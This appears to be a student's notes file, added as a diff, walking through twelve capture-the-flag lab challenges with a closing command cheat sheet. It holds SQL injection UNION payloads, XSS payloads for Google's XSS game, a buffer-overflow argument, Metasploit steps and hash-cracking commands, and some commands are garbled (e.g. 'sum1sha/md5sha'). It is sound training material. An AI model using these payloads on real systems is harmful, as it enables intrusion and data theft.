@@ -1,0 +1,110 @@
+Add User:
+adduser <username> # replace <username>
+usermod -aG sudo <username>
+
+Challenge 1:
+Convert string from base64. This can be done either by entering <echo "random_string" | base64 -d>
+Or just use CyberChef
+
+Challenge 2:
+The password is stored as a hashed value in a text file. The hash is not crackable, hash my own password using (printf "newPassword" | sha1sum/md5sum). echo can be used but needs "-n" to stop a newline.
+Alternatively, use CyberChef. 'hash-identifier' can be used to detect the hash type.
+
+Challenge 3:
+Start by extracting the .jar file. then use procyon on the .class file to get the contents. create a new .java file and paste the contents of the .class file, then edit the code to do as you wish. 
+compile this into a .class file using <javac FileName.java>. Create a manifest.txt file containing "Main-Class: FileName" outside the folder. use "jar cvfm FileName.jar manifest.txt -C Filename ." to compile into .jar.
+
+Challenge 4:
+Use "msfconsole" to open the metasploit console. search for the required exploit: "search ....". once selected, use "set" to search for peramters to set. 
+Set the RHOSTS, RPORT and VERBOSE. (Verbose is the most important as cannot see results without it. "run".
+
+Challenge 5:
+Find the code using "Find page source". use inspect to find the button actions and replace the password check with your own code taken from looking at page source to get to the next site.
+Inject SQL to find the table and data. To find the tables use: <' UNION SELECT TABLE_NAME FROM information_schema.tables; -- -> then use <' UNION SELECT * FROM [TABLE_NAME]-- ->
+Another useful command is: ' UNION SELECT COLUMN_NAME FROM information_schema.columns WHERE table_name = '[TABLE_NAME]'-- -
+
+Challenge 6:
+MITM attack. Edit the PAYLOAD sent by S to be the hash of 'A,[TOKEN]', then run the code. Take the last message (containing the flag) and save it as message.txt, also take the KMS.
+Convert the message.txt to message.bin by using base64 -d message.txt > message.bin, save this in cmd using <export M=message.bin>. Also save KMS using export KMS="287825899.."
+Find the comma location using xxd -c 1 -g 1 "$M" | grep '2c' (2c is hex for a comma). save this location as <export P=loc>.
+Split the message M at the comma using <xxd -p -l "$P" "$M" | xxd -p -r > first_half>. Find the IV (first 15 bits in hex) using <xxd -p -l 16 first_half > first_half.iv>
+Find the ciphertext (everything after 48 bits in base64) using <xxd -p -s 48 first_half | xxd -p -r | base64 > first_half.ciphertext>.
+Decrypt and save to k.txt using ./decrypt <"$(cat first_half.iv) "$KMS" "$(cat first_half.ciphertext)" > k.txt>. Clean the k.txt.
+Cut off the second half of M using <xxd -p -s $((P + 1)) $M | xxd -p -r > second half. then decode the flag using the same method as was used to find K.
+
+Challenge 7:
+Level 1: Hello, world of XSS
+The output will be directly displayed without any escaping. A simple query with <script>alert("XSS")</script> will do the job.
+
+Level 2: Persistence is key
+script blocks are not allowed.
+Post content : <img src='aaaaaaa' onerror=alert("XSS")>
+Make sure that aaaaaaa is not a valid image.
+
+Level 3: That sinking feeling...
+The only thing we can do is to use the URL for the attack vector. A few tests later, we understand that the section after the '#' is placed in a img block. Same JS trick as Level 2.
+URL : https://xss-game.appspot.com/level3/frame#1' onerror='alert("XSS")
+Other solutions:
+https://xss-game.appspot.com/level3/frame#1'><script>alert("XSS")</script>
+https://xss-game.appspot.com/level3/frame#1.jpg' onload=alert("XSS")>
+
+Level 4: Context matters
+The input will be displayed but will be escaped. Otherwise, the input is also used in the img section which displays the loading animation
+Query : 1";alert("XSS
+URL : https://xss-game.appspot.com/level4/frame?timer=1';alert('XSS 
+
+Level 5: Breaking protocol
+The next field in the URL represents the name of the function call on submit. Just put javascript:alert("XSS") into next value.
+URL : https://xss-game.appspot.com/level5/frame/signup?next=javascript%3Aalert%28%27XSS%27%29
+
+Level 6: Follow the X
+(forth hint really useful) Here we can't insert code but we can ask to load a library from Google JSAPI for instance.
+URl : https://xss-game.appspot.com/level6/frame#//google.com/jsapi?callback=alert
+
+If we try with a complete URL such as htt://google.com/jsapi?callback=alert, strange things appended. I'm sure there might be a way without any API but I didn't find it yet.
+
+Challenge 8:
+Find all the functions in the deadcode using <nm -g -C deadcode | grep "secret"> (grep is searching for the secret but is not required) upon finding location 08049e20,
+use <./deadcode "$(printf 'AAAAAAAAAAAAAAA\x20\x9e\x04\x08')"> to cause a buffer overload and run the function. 
+
+Challenge 9:
+Use wireshark to export all the objects, then open them and find the flag.
+
+Challenge 10:
+Use <john passwords.txt> john will then prompt which format to use based on the passwords. this is something like <john --format=Raw_MD5 passwords.txt>. if the results are not instant, use a different format
+
+Challenge 11:
+make a directory for mounting: <mkdir mount_directory> mount the file into the directory: <sudo mount file.img mount_directory>. Navgate to the file.
+Attempt to retrive the log using <git log -p [file]>. This will fail, giving a prompt to allow git to trust the directory: <git config --global --add safe.directory path/to/files/director>
+Rerun the command and find the log.
+
+Challenge 12:
+Check the hexdump of the image <xxd image.png | head>. This tells the file type "JFIF" is jpg not png.
+Rename the file to match the correct file type.
+<binwalk -D '.*' image.jpg --run_as=root> split out a hidden image. (note the key hidden in the second image)
+<exiftool [hidden_image]> check the metadata - in this a base32 encoded key is found, decode this using <echo "hidden_key" | base32 -d>
+<steghide extract -sf image.jpg> extract the encoded data from the original image, using the decoded hidden key to unlock it.
+<openssl enc -d -aes-256-cbc -in secret.enc -out fla.txt -pbkdf2> decode the encoded flag using the key from the hidden image.
+
+
+All commands used:
+echo "word" | base32/64 (-d)                                      decode or encode base32 or 64
+printf "word" | sum1sha/md5sha                                    encode a hash - always use printf or echo -n 
+javac File.java                                                   compile a .java file to .class
+jar cvfm FileName.jar manifest.txt -C Filename .                  Compile a directory and a manifest into a .jar file
+msfconsole                                                        open the metasploit console to run exploits
+' UNION SELECT TABLE_NAME FROM information_schema.tables; -- -    Find all the tables in SQL
+' UNION SELECT * FROM [TABLE_NAME]-- -                            Find all the data from a given table
+xxd -c 1 -g 1 "$M" | grep '2c'                                    Find a character (,) from a hexdump
+xxd -p                                                            plaintext hexdump
+xxd -l num                                                        Find the first num characters of a hexdump
+xxd -s num                                                        Find all characters after num in hexdump
+xxd -r                                                            Turn a hexdump back into plaintext
+nm -g -C                                                          Find all the functions from compiled code
+john passwords.txt                                                Use a dictionary to crack simple passwords encoded by hashes
+mkdir directory                                                   Create a directory
+git log -p                                                        Find the log of all recent git commits and the committed data
+binwalk -D '.*' image.jpg --run_as=root                           Search a binary image for embedded files and split them
+exiftool [hidden_image]                                           View the metadata
+steghide extract -sf image.jpg                                    extract steganography hidden data
+openssl enc -d -aes-256-cbc -in secret.enc -out fla.txt -pbkdf2   Decode encoded data encrypted using -aes-256-cbc
